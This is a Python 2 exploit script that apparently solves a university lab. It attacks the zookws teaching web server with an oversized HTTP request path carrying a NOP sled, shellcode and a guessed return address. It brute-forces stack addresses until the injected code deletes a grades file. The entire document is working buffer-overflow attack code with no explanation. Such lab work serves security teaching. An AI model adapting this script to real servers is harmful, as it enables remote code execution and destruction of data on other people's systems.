#!/usr/bin/python
import socket, struct, time, os, subprocess, sys, signal

RET_OFFSET = 0x814
shellcode = open("shellcode.bin").read()
nop = "\x90" * 64
sc = nop + shellcode

def cleanup():
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)

def try_addr(addr):
    cleanup()
    open("/home/httpd/grades.txt", "w").close()
    p = subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(1)
    path = "/" + sc
    path += "A" * (RET_OFFSET - len(path))
    path += struct.pack("<I", addr)
    req = "GET " + path + " HTTP/1.0\r\n\r\n"
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("localhost", 8080))
        s.send(req)
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    cleanup()
    return ok

cleanup()
for addr in xrange(0xffffcc00, 0xfffff000, 0x40):
    if try_addr(addr):
        print("SUCCESS", hex(addr))
        sys.exit(0)
print("FAILED")
